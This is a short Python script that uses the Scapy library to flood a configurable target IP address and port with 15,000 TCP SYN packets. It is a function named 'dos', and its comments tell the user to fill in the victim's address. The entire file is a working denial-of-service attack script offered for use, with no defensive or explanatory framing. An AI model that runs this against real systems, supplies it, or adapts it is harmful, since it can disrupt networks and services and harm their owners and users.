from scapy.all import *

target_ip = "10.1.10.1"  # replace with the target IP address
target_port = 80  # replace with the target port number


def dos():
    for _ in range(15000):  # number of packets you want to send
        pkt = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
        send(pkt)
        print(".", end="")

    print("\nFinished sending packets.")


if __name__ == "__main__":
    dos()
